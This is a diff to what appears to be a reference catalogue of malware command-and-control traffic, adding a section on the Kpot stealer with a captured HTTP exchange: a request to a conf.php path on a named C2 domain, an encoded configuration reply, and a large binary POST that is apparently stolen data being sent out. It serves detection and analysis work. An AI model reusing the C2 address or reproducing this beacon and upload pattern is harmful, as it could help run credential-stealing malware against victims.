@@ -258,6 +258,55 @@ Cache-Control: no-cache
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")
 
+#### Kpot stealer
+Follow tcp stream, not http stream in wireshark
+~~~
+GET /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Host: allseasongudinc.tech
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 27 Aug 2019 13:52:09 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/7.1.28
+
+194
+KwV4X3wlPk10s8hXH869gjRybIA8vP7vCwSm1Z2WW5LpEMiELVOQvustrfDp9B9igx9Jz8+noWaPlvipqvlX1nEJsgEGpkK29iHNRB5rmSyH9hPAko1ndCVOfVjGwUO/THlWJSdlDlb0FyJA2+ji7xH/Hlcwx38AIJ1SHUpp+hYHUnavdTv5uJnIAoB23+3dt7f1I54mr2Pp+eddWPHgFeIL/2BeLqaWQL1IzY1EqZhS9oIluDYmojSWgWeu6mecE5suxDRksh0KOyA7518HX4ziYflt6gBOa+daqP42C7K7PspsZGUMTRIRKayAQIT84HYmE7a/jRK1twsOz8gdJIrbaOTLaZWx/4q3Nd8bAB2yH8PvCwRz2YVsmzjBv93n3ksOHYuFtO1GcnOk0Igj
+0
+
+POST /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/octet-stream
+Content-Encoding: binary
+Host: allseasongudinc.tech
+Content-Length: 1965022
+
+P@F,jbhNH2pUP_s..tzH	W-.z.Cb]_u.PBCy9bhNH2pUdoG4PBCy9bhNH2pUdo.r...<|XH	:S.7...U 2'.M.4.!Q.:..!@..*.]
+.=.q.:.."G..,.eP+...I.%A3L$OI4l+,.B.@.R+rqh{w@.TP.p.5`]+~
+.{vA	TQ.y8.%
+A%]>%m.V.GDq.Acn]v.b{vK.U^D{.GbTVs.ZqsO.[]xx.I_W_q.ir{H3Hbn.t6.-#.q...?p.-.r.7'.
+%Q"."	I.	:)n=<..(G?$7%n..*'E.	'.(_9'0%u
+..qcE.1;.b~6;
+4h;..z4_%)z}...Mxh
+'&U^6..h>arqM3T[vy.Fmn\w.c{vM.h[~~.I`R_t
+ZqsO.[Xvy8Z_7=.|...so_Zh.g9.YZv.`..HxS+
+}.3.S-u..tw8z![~xq6a&I#Y>!+..Sb,!\.{..*.ZssK
+h^}p.Ec\et.hqzL
+Pb}x.FlQYw.iHpI.UQ~p.z.n<.w...+3&'.u.@d\_~.eH!.W.F-'___U_u.ZtpA.W^vB.@mWVr.bHpI.TQ{~.Cln\w.g{sA.hBDhm6."&.q...?.+$.
+.P...%V50..I../<S,.
+.5[#-%
+e5. ,].&8,([;+&
+e..9.z@.!=.f.l7.Mob.	.@fn..C"{2JT..=.|=x#=.m.r. V.^z-Z]...&Mc."1t._..`'<..%S?.7@V[Y4.m>
+;.qSZ#7.T.F-'___V^s.d{qA.Vb}~.IgRYv.fHpI.SX{q.zfVZv.hpuI.h[~~.Ie\^M.Z..73SF.}.GmQ_s.`lrI.RZw{.Fd\\s.gsqL.ZF..x$$U#.ea.".W.<-x.z4..*@~!,..hZ.|.DlVWq.ZqtO.U_{{.@_W_..iqwI3QZ{x.Hm\Zu>cruN.RP.B.zu;).r...<f$...~5.^O.F1 !.K>	>8V.!.3
+]30,
+V....[.1..4h.-,.P....].	/;.b...N...:E8.4..Me";3..Q.}0m .>)&A.'9.P6'D.S.0..(_~!,..hQ|y.zfR^~.gwpO	h[~p.IfP_M.arwL.QZ|
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot.png "Kpot stealer")
+
 #### Lokibot
 
 follw tcp stream, not http stream in wireshark
